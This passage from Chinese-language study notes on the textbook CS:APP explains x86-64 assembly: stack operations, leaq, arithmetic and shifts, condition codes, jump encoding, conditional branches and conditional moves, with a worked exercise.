<li><code>push</code>和<code>pop</code>指令都会自动修改<code>%rsp</code>的值，有两种方式调整<code>%rsp</code>的值，一种是直接进行加减运算，另一种是<code>push</code>和<code>pop</code>指令</li>
</ul>
<p>将一个四字值压人栈中，首先要将<mark class="label info">%rsp栈指针减8，然后将值写到新的栈顶地址</mark></p>
<p><img data-src="https://i.loli.net/2020/10/05/GwYot94ihDRcXCI.png" alt="F入栈和出栈指令.png"></p>
<mark class="label success">pushq %rbp</mark>指令等价于如下指令：

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">subq $<span class="number">8</span>, %rsp            <span class="comment">//Decrement stack pointer </span></span><br><span class="line">movq %rbp , (%rsp)       <span class="comment">//Store %rbp on stack</span></span><br></pre></td></tr></table></figure>

<p>它们之间的区别是在机器代码中<code>pushq</code>指令编码为1个字节，而上面那两条指令一共需要 8个字节。</p>
<p><img data-src="https://i.loli.net/2020/10/05/3G5oiql2Kv1dQmR.png" alt="10栈操作说明.png"></p>
<mark class="label success">popq %rax</mark>指令等价于如下指令：

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">movq (%rsp) , %rax    <span class="comment">//Read %rax from stack </span></span><br><span class="line">addq $<span class="number">8</span> ,%rsp         <span class="comment">//Increment stack pointer</span></span><br></pre></td></tr></table></figure>

<p>弹出一个四字的操作包括从栈顶位置读出数据，然后将栈指针加8。但是<mark class="label primary">值0x123仍然会保持在内存位置0x100中，直到被覆盖（例如被另一条入栈操作覆盖）</mark>。无论如何，%rsp指向的地址总是栈顶。</p>
<h3 id="3-5-算术和逻辑操作"><a href="#3-5-算术和逻辑操作" class="headerlink" title="3.5 算术和逻辑操作"></a>3.5 算术和逻辑操作</h3><p>整数算术操作可分为以下四组：</p>
<ul>
<li>加载有效地址</li>
<li>一元操作（一个操作数）</li>
<li>二元操作（两个操作数）</li>
<li>移位</li>
</ul>
<p><img data-src="https://i.loli.net/2020/10/05/GilfVdCzq7k6P9R.png" alt="11整数算术操作.png"></p>
<p>事实上，给出的每个指令类都有对这四种不同大小数据的指令（只有<mark class="label primary">leaq</mark>没有其他大小的变种 ）。</p>
<h4 id="3-5-1-加载有效地址"><a href="#3-5-1-加载有效地址" class="headerlink" title="3.5.1 加载有效地址"></a>3.5.1 加载有效地址</h4><div class="note success"><p>加载有效地址(load effective address)指令<mark class="label success">leaq</mark>实际上是<mark class="label success">movq</mark>指令的变形。它的指令形式是从内存读数据到寄存器，<mark class="label danger">但实际上它根本就没有引用内存</mark>。它的第一个操作数看上去是一个内存引用，但该指令并不是从指定的位置读人数据，而是将<mark class="label primary">有效地址</mark>写人到目的操作数。另外，它还可以简洁地描述普通的算术操作。</p>
<p><code>leaq</code>既能进行取地址运算又能进行算术运算：</p>
<ul>
<li>假设寄存器<code>%rdx</code>的值是一个地址，寄存器<code>%eax</code>的值是一个整数数值，进行下列指令<ul>
<li><code>leaq 5(%rdx) %rax</code>：<code>%rax</code>的值是一个地址，此处并没有进行内存引用去取值</li>
<li><code>leaq 5(%eax) %rax</code>：<code>%rax</code>的值是一个整数数值</li>
</ul>
</li>
</ul>
<p>例如，如果寄存器<code>%rdx</code>的值为<code>x</code>，那么指令<code>leaq 7(%rdx,%rdx,4) %rax</code>将设置寄存器<code>%rax</code>的值为<code>5x + 7</code>。编译器经常发现<code>leaq</code>的些灵活用法，<strong>根本就与有效地址计算无关，目的操作数必须 是一个寄存器</strong>。</p>
</div>

<h4 id="3-5-2-一元操作和二元操作"><a href="#3-5-2-一元操作和二元操作" class="headerlink" title="3.5.2 一元操作和二元操作"></a>3.5.2 一元操作和二元操作</h4><div class="note default"><ul>
<li>一元操作，只有一个操作数，既是源又是目的。这个操作数可以是一个寄存器，也可以是一个内存位置。比如说，指令<code>incq(%rsp)</code>会使栈顶的8字节元素加1。</li>
<li>二元操作，第二个操作数既是源又是目的。<ul>
<li>第一个操作数可以是立即数、寄存器或是内存位置。</li>
<li>第二个操作数可以是寄存器或是内存位置。（注意， <strong>当第二个操作数为内存地址时，处理器必须从内存读出值，执行操作，再把结果写回内存</strong>。）</li>
</ul>
</li>
</ul>
</div>



<h4 id="3-5-3-移位操作"><a href="#3-5-3-移位操作" class="headerlink" title="3.5.3 移位操作"></a>3.5.3 移位操作</h4><ol>
<li>移位操作，先给出移位量，然后第二项给出的是要移位的数。可以进行算术和逻辑右移。</li>
<li>移位量可以是一个立即数，或者放在单字节寄存器<mark class="label primary">%cl</mark>中。<mark class="label warning">（这些指令很特别，因为只允许以这个特定的寄存器作为操作数）</mark></li>
<li><code>%cl</code>的值为一个字节，1个字节的移位量使得移位量的编码范围可以达到 $2^8-1&#x3D;255$ 位。</li>
<li>x86-64中，对 $w$ 位长的数据值进行移位操作时，移位量是由寄存器<code>%cl</code>的低 $m$ 位决定的，这里$2^m&#x3D;w$。高位会被忽略。即：对于 $w$ 位的数据进行移位, 并不是直接使用<code>%cl</code>的值, 而是使用<code>%cl</code>的低 $m$ 位的值，2的 $m$ 次幂等于当前操作位数的大小，大于 $m$ 的位会被忽略。</li>
<li>当寄存器<code>%cl</code>的十六进制值为 0xFF 时：</li>
</ol>
<table>
<thead>
<tr>
<th align="center">命令</th>
<th align="center">等式</th>
<th align="center">有效位</th>
<th align="center">移位量</th>
</tr>
</thead>
<tbody><tr>
<td align="center">salb</td>
<td align="center">$2^3&#x3D;8$</td>
<td align="center">11111<mark class="label success">111</mark></td>
<td align="center">111&#x3D;7</td>
</tr>
<tr>
<td align="center">salw</td>
<td align="center">$2^4&#x3D;16$</td>
<td align="center">1111 <mark class="label success">1111</mark></td>
<td align="center">1111&#x3D;15</td>
</tr>
<tr>
<td align="center">sall</td>
<td align="center">$2^5&#x3D;32$</td>
<td align="center">111<mark class="label success">11111</mark></td>
<td align="center">11111&#x3D;31</td>
</tr>
<tr>
<td align="center">salq</td>
<td align="center">$2^6&#x3D;64$</td>
<td align="center">11<mark class="label success">111111</mark></td>
<td align="center">111111&#x3D;63</td>
</tr>
</tbody></table>
<ol start="6">
<li>左移指令有两个名字：<code>SAL</code>和<code>SHL</code>。两者的效果是一样的，都是将右边填上0。右移指令不同，<code>SAR</code>执行算术移位(填上符号位)，而<code>SHR</code>执行逻辑移位(填上0)。<strong>移位操作的目的操作数可以是一个寄存器或是一个内存位置</strong>。</li>
<li>图3-10所示的大多数指令，既可以用于无符号运算，也可以用于补码运算。<mark class="label danger">只有右移操作要求区分有符号和无符号数</mark>。这个特性使得补码运算成为实现有符号整数运算的一种比较好的方法的原因之一。</li>
</ol>
<p><img data-src="https://i.loli.net/2020/10/08/eKi1gypYuSIAxOs.png" alt="12算术运算与汇编.png"></p>
<h4 id="3-5-4-乘法和除法"><a href="#3-5-4-乘法和除法" class="headerlink" title="3.5.4 乘法和除法"></a>3.5.4 乘法和除法</h4><div class="note primary"><p><strong>注意，一个a位的操作数和一个b位的操作数，产生的乘积是a+b位的操作数</strong></p>
</div>

<p>两个 64 位有符号或无符号整数相乘得到的乘积需要 128 位来表示。x86-64 指令集对 128 位（16字节）数的操作提供有限的支持。 <mark class="label danger">故使用寄存器%rdx和%rax来组成一个128位的八字来保存乘法产生的128位积或者除法的被除数的高64位和低64位或者除法产生的商和余数</mark>  图 3-12 描述的是支持产生两个 64 位数字的全 128 位乘积以及整数除法的指令。</p>
<p><img data-src="https://i.loli.net/2020/10/08/nTdwNpa7mgizOYU.png" alt="13特殊的算术操作.png"></p>
<div class="note primary"><p><code>imulq</code>属于<code>IMUL</code>指令类，该指令有两种不同的形式。其中一种，如图3-10 所示，是<mark class="label warning">双操作数</mark>乘法指令。它从两个 64 位操作数产生一个 128 位乘积。而另一种属于<mark class="label warning">单操作数</mark>乘法指令的有符号乘法（补码乘法）。<code>x86-64</code>提供了两条单操作数乘法：</p>
<ul>
<li><mark class="label primary">imulq</mark>：补码乘法</li>
<li><mark class="label primary">mulq</mark>：无符号乘法</li>
</ul>
<p>这两条指令都要求<mark class="label success">一个参数必须在寄存器 %rax 中</mark>，而另一个作为指令的源操作数给出。 </p>
<p><strong>乘法中</strong>：乘积存放在寄存器<mark class="label default">%rdx</mark>（高64位）和  <mark class="label default">%rax</mark>（低64位）中。虽然<code>imulq</code> 这个名字可以用于两个不同的乘法操作，但是汇编器能够通过计算操作数的数目，分辨出想用哪条指令。</p>
<p><strong>除法中</strong>：</p>
<ul>
<li>有符号除法指令<code>idivl</code> 将寄存器<mark class="label default">%rdx</mark>（高64位)）和<mark class="label default">%rax</mark>（低64位）中的128 位数作为被除数，而除数作为指令的操作数给出。</li>
<li>指令将商存储在寄存器<mark class="label default">%rax</mark>中，将余数存储在寄存器<mark class="label default">%rdx</mark>中。</li>
<li>当一个64 位的数作为被除数时，需要将其扩展为 128 位，由于寄存器<code>%rdx</code>存放高64位，则需要分为有符号除法还是无符号除法。<ul>
<li>无符号运算：<code>%rdx</code>的位应该设置为全0 </li>
<li>有符号运算：<code>%rdx</code>的位应该设置为<code>%rax</code>的符号位，使用<code>cqto</code>指令来完成这一操作，这条指令不需要操作数--&gt;它隐含读出<code>%rax</code>的符号位， 并将它复制到<code>%rdx</code>的所有位。</li>
</ul>
</li>
</ul>
</div>



<h3 id="3-6-控制"><a href="#3-6-控制" class="headerlink" title="3.6 控制"></a>3.6 控制</h3><p>机器代码提供两种基本的低级机制来实现有条件的行为：测试数据值，然后根据测试的结果来改变<strong>控制流</strong>或者<strong>数据流</strong>。</p>
<h4 id="3-6-1-条件码（标志寄存器）"><a href="#3-6-1-条件码（标志寄存器）" class="headerlink" title="3.6.1 条件码（标志寄存器）"></a>3.6.1 条件码（标志寄存器）</h4><p>除了整数寄存器，CPU还维护着一组单个位（一位，值为0或1）的条件码（condition code） 寄存器，它们描述了最近的算术或逻辑操作的属性。可以检测这些寄存器来执行条件分支指令。</p>
<div class="note info"><p>最常用 的条件码有：</p>
<ul>
<li>CF：进位标志。最近的操作使最高位产生了进位。可用来检查无符号操作的溢出。 </li>
<li>ZF：零标志。最近的操作得出的结果为0。</li>
<li>SF：负数符号标志。最近的操作得到的结果为负数。</li>
<li>OF：溢出标志。最近的操作导致一个补码溢出--&gt;正溢出或负溢出。</li>
</ul>
</div>

<div class="note danger"><p><strong>正溢出与负溢出</strong>：</p>
<p>首先，一个正数与一个负数相加，不可能溢出，因为结果的绝对值一定小于两个加数的绝对值，既然两个加数能合理表示出来，结果一定也能合理表示出来。</p>
<ul>
<li><strong>正溢出是由于两个很大的正数相加，导致符号位变成1的情况</strong>。如 $0110+0011&#x3D;1001$（假设最大只能运算4位）</li>
<li><strong>负溢出则是两个很小的负数相加，导致符号位变成0的情况</strong>。如 1011(-5)+1011(-5)&#x3D;10110-&gt;0110​ （溢出）；如 $1111(-1)+1111(-1)&#x3D;11110-&gt;1110$ 则没溢出。</li>
</ul>
<p>　因此：</p>
<ul>
<li>正溢出的判断标准是符号位或最高位有进位</li>
<li>负溢出的判断标准是符号位和最高位只有一个发生了进位。符号位和最高位同时发生进位则没溢出。（注意，这里的最高位指的是去掉符号位后的最高位，即符号位后面一位。）</li>
</ul>
</div>

<p><code>leaq</code>指令不改变任何条件码，因为它是用来进行地址计算的。除此之外，<mark class="label warning">图3-10中列出的所有指令都会设置条件码</mark> </p>
<p>对于逻辑操作：</p>
<ul>
<li><code>XOR</code>，进位标志和溢出标志会设置成 0 </li>
<li>移位操作，进位标志将设置为最后一个被移出的位，而溢出标志设置为 0</li>
<li><code>INC</code>和<code>DEC</code>指令会设置溢出和零标志，但是不会改变进位标志</li>
</ul>
<p><code>CMP</code>和<code>TEST</code>类指令只设条件码而不改变任何其他寄存器。</p>
<ul>
<li><code>CMP</code>和<code>SUB</code>指令的行为是一样的，但是<code>CMP</code>指令只设条件码而不更新目的寄存器。如果两个操作数相等，这些指令会将零标志设置为1 ，而其他标志可以用来确定两个操作数的大小关系。</li>
<li><code>TEST</code>和<code>AND</code>指令的行为是一样的，但是<code>TEST</code>指令只设条件码而不更新目的寄存器。典型的用法是，两个操作数是一样的（例如，<code>testq %rax,%rax</code>用来检查<code>%rax</code>是负数、零还是正数），或其中一个操作数是掩码，用来指示哪些位应该被测试。</li>
<li><code>CMP</code>指令会设置进位标志，因为无符号比较使用的是进位标志（CF）和零标志（ZF）的组合。</li>
</ul>
<span id="cmptest">

<table>
<thead>
<tr>
<th align="center">指令</th>
<th align="center">基于</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">CMP  $S_1 , S_2$</td>
<td align="center">$S_2 - S_1$</td>
<td align="center">比较</td>
</tr>
<tr>
<td align="center">cmpb</td>
<td align="center"></td>
<td align="center">比较字节</td>
</tr>
<tr>
<td align="center">cmpw</td>
<td align="center"></td>
<td align="center">比较字</td>
</tr>
<tr>
<td align="center">cmpl</td>
<td align="center"></td>
<td align="center">比较双字</td>
</tr>
<tr>
<td align="center">cmpq</td>
<td align="center"></td>
<td align="center">比较四字</td>
</tr>
<tr>
<td align="center">TEST  $S_1 , S_2$</td>
<td align="center">$S_1 $ &amp; $S_2$</td>
<td align="center">测试</td>
</tr>
<tr>
<td align="center">testb</td>
<td align="center"></td>
<td align="center">测试字节</td>
</tr>
<tr>
<td align="center">testw</td>
<td align="center"></td>
<td align="center">测试字</td>
</tr>
<tr>
<td align="center">testl</td>
<td align="center"></td>
<td align="center">测试双字</td>
</tr>
<tr>
<td align="center">testq</td>
<td align="center"></td>
<td align="center">测试四字</td>
</tr>
</tbody></table>
</span>

<p><a href="#cmptest"><img data-src="https://img.shields.io/badge/%E6%AF%94%E8%BE%83%E5%92%8C%E6%B5%8B%E8%AF%95%E6%8C%87%E4%BB%A4-%E5%9B%BE_3%E2%80%9413-1fd0f6.svg?colorA=ff69b4" alt="1"></a></p>
<h4 id="3-6-2-访问条件码"><a href="#3-6-2-访问条件码" class="headerlink" title="3.6.2 访问条件码"></a>3.6.2 访问条件码</h4><p>条件码通常不会直接读取，常用的使用方法有三种：</p>
<ul>
<li>可以根据条件码的某种组合， 将一个字节设置为0或者1</li>
<li>可以条件跳转到程序的某个其他的部分</li>
<li>可以有条件地传送数据</li>
</ul>
<ol>
<li>对于第一种情况，图 3-14 中描述的<mark class="label primary">指令根据条件码的某种组合，将一个字节设置为 0 或者 1</mark>。我们将这一整类指令称为SET指令；</li>
<li>它们之间的区别就在于它们考虑的<strong>条件码的组合</strong>是什么，这些指令名字的不同后缀指明了它们所考虑的条件码的组合。</li>
<li><strong>这些指令的后缀表示不同的条件而不是操作数大小</strong>，了解这一点很重要。例如，指令<code>setl </code>和 <code>setb</code>表示“小于时设置（set less）” 和“低于时设置（set below）”，而不是“设置长字（set long word）”和“设置字节（set byte）”。</li>
</ol>
<p>一条<code>SET</code>指令的<mark class="label info">目的操作数</mark>是低位单字节寄存器元素（图3-2）之一，或是一个字节的内存位置，指令会将这个字节设置成 0 或者 1。为了得到一个 32 位或 64 位结果，我们必须对<mark class="label warning">高位清零</mark>。</p>
<p><img data-src="https://i.loli.net/2020/10/09/peA6YDikbzqPVOd.png" alt="15SET指令.png"></p>
<div class="note warning"><p><code>CMP</code>指令会设置进位标志，因为无符号比较使用的是进位标志（CF）和零标志（ZF）的组合。</p>
</div>

<h4 id="3-6-3-跳转指令"><a href="#3-6-3-跳转指令" class="headerlink" title="3.6.3 跳转指令"></a>3.6.3 跳转指令</h4><p>跳转指令（<code>jump</code>）会使正在执行的指令切换到程序中一个全新的位置。跳转的目的地通常用一个标号（label）指明。</p>
<div class="note success"><p>在产生目标代码文件时，汇编器会确定所有带标号指令的地址，并将跳转目标（目的指令的地址）编码为跳转指令的一部分。</p>
</div>

<mark class="label danger">jmp指令是无条件跳转的</mark> 分为直接跳转和间接跳转

<ul>
<li>直接跳转：跳转目标是作为指令的一部分编码的，直接跳转是给出一个标号作为跳转目标的</li>
<li>间接跳转：跳转目标是从寄存器或内存位置中读出。间接跳转的写法是 <code>jmp *Operand</code> ，<code>*</code>后跟一个操作数指示符</li>
</ul>
<p>JCC：有条件跳转</p>
<p>JMP：无条件跳转</p>
<ul>
<li><code>jmp .L1</code>：跳转到<code>L1</code>标号</li>
<li><code>jmp *%rax</code>：用寄存器<code>%rax</code>中的值作为跳转目标</li>
<li><code>jmp *(%rax)</code>：以<code>%rax</code>中的值做为读地址，从内存中读出跳转目标</li>
</ul>
<p><img data-src="https://i.loli.net/2020/10/10/wF6uXslOJ8EGhNC.png" alt="16jmp指令.png"></p>
<h4 id="3-6-4-跳转指令的编码"><a href="#3-6-4-跳转指令的编码" class="headerlink" title="3.6.4 跳转指令的编码"></a>3.6.4 跳转指令的编码</h4><p>这里的编码指的是机器码，研究跳转指令的汇编代码如何编译为机器代码，然后与地址联系起来。</p>
<div class="note success"><p><strong><code>jmp .L1</code>：<code>.L1</code>是跳转目标，它的机器编码称为目标编码。这整条指令的编码 &#x3D; <code>jmp</code>的编码（eb）+<code>.L1</code>的编码</strong></p>
</div>

<p>跳转指令的编码分为： </p>
<ul>
<li><strong>PC相对的</strong>（PC-relative）。将目标指令的地址与紧跟在跳转指令后面那条指令的地址之间的差作为编码【跳转指令的目标编码（偏移量） &#x3D; 目标指令的地址（要跳到的地址） $-$ 跳转指令后面那条指令的地址（程序计数器的值）】。这些地址偏移量可以编码为 1、2、4 个字节。程序计数器的值是跳转指令后面的那条指令的地址，而不是跳转指令本身的地址。 </li>
<li><strong>绝对地址</strong>，用 4 个字节直接指定目标，汇编器和连接器会选择适当的跳转目的编码。</li>
</ul>
<p>PC相对编码例子：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">（汇编代码）</span><br><span class="line">movq    %rdi, %rax </span><br><span class="line">jmp     .L2 </span><br><span class="line">.L3: </span><br><span class="line">  sarq  %rax</span><br><span class="line">.L2: </span><br><span class="line">  testq %rax, %rax </span><br><span class="line">  jg    .L3 </span><br><span class="line">  rep;  ret</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">（机器代码的反汇编版本）</span><br><span class="line">    <span class="number">0</span>:   <span class="number">48</span> <span class="number">89</span> f8                       mov     %rdi, %rax </span><br><span class="line">    <span class="number">3</span>:   eb <span class="number">03</span>                          jmp     <span class="number">8</span> &lt;loop+<span class="number">0x8</span>&gt;</span><br><span class="line">    <span class="number">5</span>:   <span class="number">48</span> d1 f8                       sar     %rax </span><br><span class="line">    <span class="number">8</span>:   <span class="number">48</span> <span class="number">85</span> c0                       test    %rax, %rax </span><br><span class="line">    b:   <span class="number">7f</span> f8                          jg      <span class="number">5</span> &lt;loop+<span class="number">0x5</span>&gt; </span><br><span class="line">    d:   f3 с<span class="number">3</span>                          repz retq</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">（链接后的程序反汇编版本）</span><br><span class="line">    <span class="number">4004</span>d0:   <span class="number">48</span> <span class="number">89</span> f8                  mov     %rdi, %rax </span><br><span class="line">    <span class="number">4004</span>d3:   eb <span class="number">03</span>                     jmp     <span class="number">4004</span>d8 &lt;loop+<span class="number">0x8</span>&gt;</span><br><span class="line">    <span class="number">4004</span>d5:   <span class="number">48</span> d1 f8                  sar     %rax </span><br><span class="line">    <span class="number">4004</span>d8:   <span class="number">48</span> <span class="number">85</span> c0                  test    %rax, %rax </span><br><span class="line">    <span class="number">4004</span>db:   <span class="number">7f</span> f8                     jg      <span class="number">4004</span>d5 &lt;loop+<span class="number">0x5</span>&gt; </span><br><span class="line">    <span class="number">4004</span>dd:   f3 с<span class="number">3</span>                     repz retq</span><br></pre></td></tr></table></figure>



<div class="note primary"><p>对于机器代码的反汇编版本：</p>
<ul>
<li><p><mark class="label success">反汇编器以十六进制格式给出所有的数字</mark> </p>
</li>
<li><p><code>jmp</code>指令后的大小数字、机器代码或地址全都是以<mark class="label success">补码</mark>的形式给出</p>
</li>
<li><p>右边反汇编器产生的注释中，第2行中跳转指令的跳转目标指明为<code>0x8</code>，第5行中跳转指令的跳转目标是<code>0x5</code>。</p>
</li>
</ul>
<p>根据计算公式：</p>
<ul>
<li>第一条跳转指令的目标编码（在第二个字节中)为 <code>0x3</code> （偏移量或目标编码）是由 <code>0x8 - 0x5</code> 得到（<code>0x8</code>是要跳到的地址，<code>0x5</code>是跳转指令后面那条指令的地址或程序计数器的值）</li>
<li>第二条跳转指令的目标编码 <code>0xf8</code> 是由 <code>0x5 - 0xd</code> 得到。由于是以补码的形式给出，则<code>0xf8</code>表示十进制的<code>-8</code>。</li>
</ul>
<p>对于第一条跳转指令机器代码的反汇编版本： <code>3:  eb 03       jmp  8 &lt;loop+0x8&gt;</code>  ：</p>
<ul>
<li><code>3:</code>：指令<code>jmp  8 &lt;loop+0x8&gt;</code>装载前的地址，值为 <code>0x3</code>，是补码形式</li>
<li><code>eb 03</code>：即为指令<code>jmp  8 &lt;loop+0x8&gt;</code>的指令编码（只需要两个字节，<code>eb</code>是低字节、<code>03</code>是高字节）</li>
<li><code>eb</code>：是<code>jmp</code>指令的（机器）编码，是补码形式</li>
<li><code>03</code>：<code>jmp</code>指令跳转目标的编码，也叫做偏移量，是补码形式</li>
</ul>
<p>注意：AMD 建议用<code>rep</code>后面跟<code>ret</code>的组合来避免使<code>ret</code>成为条件跳转指令的目标。如果没有<code>rep</code>，当分支不跳转时，<code>jg</code>指令会继续到<code>ret</code>指令。（<code>rep</code>或<code>repz</code>是同义名，<code>retq</code>和<code>ret</code>是同义名。以后遇到<code>rep</code>或<code>repz</code>就直接无视掉。）</p>
</div>



<h4 id="3-6-5-用条件控制来实现条件分支"><a href="#3-6-5-用条件控制来实现条件分支" class="headerlink" title="3.6.5 用条件控制来实现条件分支"></a>3.6.5 用条件控制来实现条件分支</h4><p>本节主要探讨C语言中<code>if-else</code>到汇编的转换：一般使用测试语句或者比较语句 --&gt;<code>CMP</code>、<code>TEST</code></p>
<p>C语言中<code>if-else</code>语句的通用形式模版如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (test-expr)</span><br><span class="line">    then-statement</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">else</span>-statement</span><br></pre></td></tr></table></figure>



<p>用C语言来描述汇编代码的程序控制流：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> t = test-expr;</span><br><span class="line">    <span class="keyword">if</span> (!t)</span><br><span class="line">        <span class="keyword">goto</span> <span class="literal">false</span>;</span><br><span class="line">    then-statement</span><br><span class="line">    <span class="keyword">goto</span> done;</span><br><span class="line"><span class="literal">false</span>:</span><br><span class="line">    <span class="keyword">else</span>-statement</span><br><span class="line">done:</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>

<p><img data-src="https://i.loli.net/2020/10/12/GlaFLrhc1EtXUvZ.png" alt="17条件语句的编译.png"></p>
<p>练习题<code>3.18</code>，从如下形式的 C 语言代码开始：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">test</span><span class="params">(<span class="keyword">long</span> x, <span class="keyword">long</span> y, <span class="keyword">long</span> z)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">long</span> val = ___________;</span><br><span class="line">    <span class="keyword">if</span> (______) &#123;</span><br><span class="line">        <span class="keyword">if</span> (______)</span><br><span class="line">            val = ______;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            val = ______;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (______)</span><br><span class="line">        val = ______;</span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>GCC 产生如下的汇编代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># long test(long x, long y, long z)</span></span><br><span class="line"><span class="meta"># x in %rdi, y in %rsi, z in %rdx</span></span><br><span class="line">test:</span><br><span class="line">	leaq  (%rdi, %rsi), %rax  <span class="meta"># long temp1 = x + y</span></span><br><span class="line">	addq  %rdx, %rax          # temp1 = temp1 + z</span><br><span class="line">	cmpq  $<span class="number">-3</span>, %rdi           # 比较 x 和 <span class="number">-3</span></span><br><span class="line">	jge   .L2                 <span class="meta"># x &gt;= -3 时跳转到 L2</span></span><br><span class="line">	cmpq  %rdx, %rsi          # 比较 y 和 z</span><br><span class="line">	jge   .L3                 <span class="meta"># y &gt;= z 时跳转到 L3</span></span><br><span class="line">	movq  %rdi, %rax          # temp1 = x</span><br><span class="line">	imulq %rsi, %rax          # temp1 = temp1 * y</span><br><span class="line">	ret                       <span class="meta"># return</span></span><br><span class="line">.L3:</span><br><span class="line">  movq  %rsi, %rax          # 此时 x &lt; <span class="number">-3</span>，y &gt;= z；temp1 = y</span><br><span class="line">  imulq %rdx, %rax          # temp1 = temp1 * z</span><br><span class="line">  ret                       <span class="meta"># return</span></span><br><span class="line">.L2:</span><br><span class="line">  cmpq  $<span class="number">2</span>, %rdi            # 此时 x &gt;= <span class="number">-3</span>；比较 x 和 <span class="number">2</span></span><br><span class="line">  jle   .L4                 <span class="meta"># x &lt;= 2 时跳转到 L4</span></span><br><span class="line">  movq  %rdi, %rax          # temp1 = x</span><br><span class="line">  imulq %rdx, %rax          # temp1 = temp1 * z</span><br><span class="line">.L4:</span><br><span class="line">  rep; ret</span><br></pre></td></tr></table></figure>

<p>填写 C 代码中缺失的表达式：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">test</span><span class="params">(<span class="keyword">long</span> x, <span class="keyword">long</span> y, <span class="keyword">long</span> z)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">long</span> val = x + y + z;</span><br><span class="line">    <span class="keyword">if</span> (x &lt; <span class="number">-3</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (y &lt; z)</span><br><span class="line">            val = x * y;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            val = y * z;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (x &gt; <span class="number">2</span>) </span><br><span class="line">        val = x * z;</span><br><span class="line">   <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="3-6-6-用条件传送来实现条件分支"><a href="#3-6-6-用条件传送来实现条件分支" class="headerlink" title="3.6.6 用条件传送来实现条件分支"></a>3.6.6 用条件传送来实现条件分支</h4><p><code>3.6.5</code>中使用的是<code>控制</code>的条件转移，虽然简单通用，但是条件码分支对于现代CPU效率比较低。所以<code>3.6.6</code>使用<code>数据</code>的条件转移，与使用控制的条件转移执行效果相同，但是会提前计算出结果的值然后进行分支预测。这种方法在条件计算量相对较小的情况下（两个表达式都很容易计算，例如分别都是一条加法指令），才会使用条件传送。</p>
<ul>
<li>因为处理器通过使用“流水线”来获得高性能，而流水线需要事先确定要执行的指令序列，遇到条件分支时需要采用“分支预测逻辑”来猜测每条跳转指令是否会执行。若猜错，需要处理器丢掉这些已经做好的工作，浪费大约15~30个时钟周期。</li>
<li>假设预测错误的概率是$p$，如果没有预测错误，执行代码的时间是$T_{OK}$，否则是$T_{MP}$，则执行代码的平均时间$T_{avg} &#x3D; T_{OK} + p * T_{MP}$，推导出$T_{MP}&#x3D;2(T_{ran}-T_{OK})$</li>
</ul>
<p><img data-src="https://i.loli.net/2020/10/12/ZKRX5yFUPzh81Eu.png" alt="18条件传送指令.png"></p>
<ul>
<li><code>cmov*</code>：--&gt; <code>cmov</code>指条件传送，<code>*</code>是指令后缀，与<code>SET</code>、<code>JMP</code>指令类一样。</li>
<li>有两个操作数：第一个操作数是源操作数，可以是寄存器或者内存，第二个操作数是目的，只能是寄存器。</li>
<li>功能：只有在指定的条件满足时（结合<code>TEST</code>、<code>JMP</code>），才会将源值复制到目的寄存器中。</li>
<li>指令类<mark class="label warning">不支持单字节的条件传送</mark> ，源和目的的值可以是16位、32位、64位。</li>
<li>汇编器可以从目标寄存器的名字推断出条件传送指令的操作数长度，所以对所有的操作数长度，都可以使用同一个的指令名字。</li>
</ul>
<p>条件控制转移编译与条件传送编译对比：</p>
<p>C语言形式：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v = test-expr ? then-expr : <span class="keyword">else</span>-expr;</span><br></pre></td></tr></table></figure>

<p>条件控制转移形式：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">if</span> (!test-expr)</span><br><span class="line">        <span class="keyword">goto</span> <span class="literal">false</span>;</span><br><span class="line">    v = then-expr</span><br><span class="line">    <span class="keyword">goto</span> done;</span><br><span class="line"><span class="literal">false</span>:</span><br><span class="line">    v = <span class="keyword">else</span>-expr;</span><br><span class="line">done:</span><br></pre></td></tr></table></figure>

<p>条件传送形式：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v = then-expr;</span><br><span class="line">ve = <span class="keyword">else</span>-expr;</span><br><span class="line">t = test-expr;</span><br><span class="line"><span class="keyword">if</span> (!t) v = ve;</span><br></pre></td></tr></table></figure>

<p>基于条件传送的代码，会对$then-rexpr$和$else-expr$都求值，最终值的选择基于对$test-expr$的求值。</p>
<ul>
<li>不是所有的条件表达式都可以用传送条件来编译。如果<code>then-expr</code>或<code>else-expr</code>可能产生错误条件或副作用，会导致非法的行为。（如给全局变量赋值、<code>return p ? *p : 0;</code>等）</li>
<li>条件传送并不总是会提高代码的效率。编译器一般只在两个表达式都很容易计算且没有副作用时才会使用。</li>
</ul>
<h4 id="3-6-7-循环"><a href="#3-6-7-循环" class="headerlink" title="3.6.7 循环"></a>3.6.7 循环</h4><p>C语言提的循环结构：</p>
<ul>
<li><code>do-while</code></li>
<li><code>while</code></li>
<li><code>for</code></li>
</ul>
